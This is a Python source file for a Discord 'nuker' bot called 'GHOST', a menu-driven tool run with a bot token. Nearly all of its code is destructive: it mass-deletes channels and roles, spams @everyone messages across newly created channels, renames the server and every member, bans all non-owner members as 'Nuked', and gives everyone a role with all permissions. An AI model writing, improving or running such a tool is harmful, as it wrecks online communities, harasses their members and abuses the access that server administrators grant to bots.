import discord
from discord.ext import commands
import asyncio
import os
from colorama import init, Fore
import requests

init(autoreset=True)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

gradient = [
    "\033[38;5;255m",
    "\033[38;5;250m",
    "\033[38;5;247m",
    "\033[38;5;244m",
    "\033[38;5;241m",
    "\033[38;5;240m",
]
reset = "\033[0m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def main_menu():
    clear()
    print()
    print(rf"{gradient[0]}                                           _____   __ __  ____    ____ ______{reset}")
    print(rf"{gradient[1]}                                          / ___/  / // / / __ \  / __//_  __/{reset}")  
    print(rf"{gradient[1]}                                         / (_ /  / _  / / /_/ / _\ \   / /   {reset}") 
    print(rf"{gradient[2]}                                         \___/  /_//_/  \____/ /___/  /_/    made by: @8dfh {reset}")
    print()                                                                               
    print(f"{gradient[3]}                                    --------------------------------------------{reset}")
    print()
    print(f"{gradient[0]}       [01] > Delete Channels     [02] > Create Channels    [03] > Rename Server        [04] > Rename All Members{reset}")
    print(f"{gradient[1]}       [05] > Ban All Members     [06] > Role Raid          [07] > Change Icon          [08] > Exit{reset}")
    print(f"{gradient[3]}                                                                            {reset}")
    print()

def show_menu():
    main_menu()
    return input(f"{gradient[0]}[ghost@MENU] > {reset}")

@bot.event
async def on_ready():
    guild = bot.guilds[0]

    while True:
        escolha = show_menu()

        if escolha == "01":
            print()
            tipo = input(f"{gradient[0]}[ghost@DeleteType] : Text / Voice / Category / All > {reset}").lower()
            print(f"{gradient[0]}\n[ghost@Deleting] > Channels...\n{reset}")
            channels = []

            if tipo == "text":
                channels = [c for c in guild.text_channels]
            elif tipo == "voice":
                channels = [c for c in guild.voice_channels]
            elif tipo == "category":
                channels = [c for c in guild.categories]
            elif tipo == "all":
                channels = guild.channels
            else:
                print(f"{Fore.RED}Invalid type specified.{reset}")

            if not channels:
                print(f"{Fore.RED}No channels of type '{tipo}' found.{reset}")
            else:
                for channel in channels:
                    try:
                        await channel.delete()
                        print(f"{Fore.GREEN}Channel Deleted | {channel.name}\n")
                    except:
                        pass
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "02":
            try:
                print()
                qtd = int(input(f"{gradient[0]}[ghost@Amount] > {reset}"))
                print()
                nome = input(f"{gradient[0]}[ghost@Name] > {reset}")
                print()
                tipo = input(f"{gradient[0]}[ghost@Type] : Text / Voice > {reset}").lower()
                print()
                mensagem = input(f"{gradient[0]}[ghost@Message] > {reset}")
                print()
                repeticoes = int(input(f"{gradient[0]}[ghost@Repeat] > {reset}"))
                print()

                for i in range(qtd):
                    channel_name = f"{nome}-{i+1}"

                    if tipo == "voice":
                        channel = await guild.create_voice_channel(channel_name)
                    else:
                        channel = await guild.create_text_channel(channel_name)

                    print(f"{Fore.GREEN}Channel Created | {channel_name}\n")

                    if tipo != "voice":
                        for _ in range(repeticoes):
                            msg = await channel.send(f"@everyone {mensagem}")
                            print(f"{Fore.GREEN}Message Successful | {msg.id} | ghost@menu")
                        print()

            except Exception as e:
                print(f"Error: {e}")
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "03":
            print()
            novo_nome = input(f"{gradient[0]}[ghost@NewName] > {reset}")
            try:
                await guild.edit(name=novo_nome)
                print()
                print(f"{Fore.GREEN}Server Renamed | {novo_nome}\n")
            except Exception as e:
                print(f"Error: {e}")
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "04":
            print()
            novo_nome = input(f"{gradient[0]}[ghost@Username] > {reset}")
            print(f"\n{gradient[0]}[ghost@Renaming] > All members...\n{reset}")
            for member in guild.members:
                try:
                    await member.edit(nick=novo_nome)
                    print(f"{Fore.GREEN}Renamed | {member.name} -> {novo_nome}\n")
                except:
                    pass
            input(f"\n{gradient[0]}Press Enter to return...{reset}")


        elif escolha == "05":
            print()
            members_to_ban = [member for member in guild.members if not member.bot and member != guild.owner]

            if not members_to_ban:
                print(f"{Fore.RED}No members to ban.\n")
            else:
                print(f"\n{gradient[0]}[ghost@Banning] > All members...{reset}\n")
                for member in members_to_ban:
                    try:
                        await member.ban(reason="Nuked")
                        print(f"{Fore.GREEN}Member Banned | {member.name}\n")
                    except Exception as e:
                        print(f"{Fore.RED}Failed to ban {member.name} | {e}\n")

            input(f"\n{gradient[0]}Press Enter to return...{reset}")


        elif escolha == "06":
            print()
            delete_roles = input(f"{gradient[0]}[ghost@DeleteRoles] : yes / no > {reset}").lower()
            if delete_roles == "yes":
                print(f"\n{gradient[0]}[ghost@DeletingRoles] > All roles...\n{reset}")
                for role in guild.roles:
                    try:
                        if role.name != "@everyone":
                            await role.delete()
                            print(f"{Fore.GREEN}Role Deleted | {role.name}\n")
                    except:
                        pass

            create_new = input(f"\n{gradient[0]}[ghost@CreateNewRole] : yes / no > {reset}").lower()
            if create_new == "yes":
                print()
                nome_raid = input(f"{gradient[0]}[ghost@RoleName] > {reset}")
                try:
                    nova_role = await guild.create_role(name=nome_raid, permissions=discord.Permissions.all())
                    print()
                    print(f"{Fore.GREEN}Role Created | {nova_role.name}\n")

                    for member in guild.members:
                        try:
                            await member.add_roles(nova_role)
                            print(f"{Fore.GREEN}Role Assigned | {member.name}\n")
                        except:
                            pass
                except Exception as e:
                    print(f"{Fore.RED}Failed to create role: {e}\n")
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "07":
            print()
            path = input(f"{gradient[0]}[ghost@IconURL_or_Path] > {reset}")
            try:
                print()
                print(f"{Fore.YELLOW}Downloading icon...\n")
                if path.startswith("http"):
                    response = requests.get(path)
                    icon_bytes = response.content
                else:
                    with open(path, "rb") as f:
                        icon_bytes = f.read()
                print(f"{Fore.YELLOW}Applying icon...\n")
                await guild.edit(icon=icon_bytes)
                print(f"{Fore.GREEN}Icon Changed Successfully\n")
            except Exception as e:
                print(f"{Fore.RED}Failed to change icon: {e}\n")
            input(f"\n{gradient[0]}Press Enter to return...{reset}")

        elif escolha == "08":
            print()
            print("Exiting...")
            await bot.close()
            break

        else:
            input(f"\n{gradient[0]}Invalid option. Press Enter...{reset}")

if __name__ == "__main__":
    clear()
    main_menu()
    token = input(f"{gradient[0]}[ghost@BotToken] > {reset}")
    try:
        bot.run(token, log_handler=None)
    except Exception as e:
        print(f"{Fore.RED}Failed to run bot: {e}")
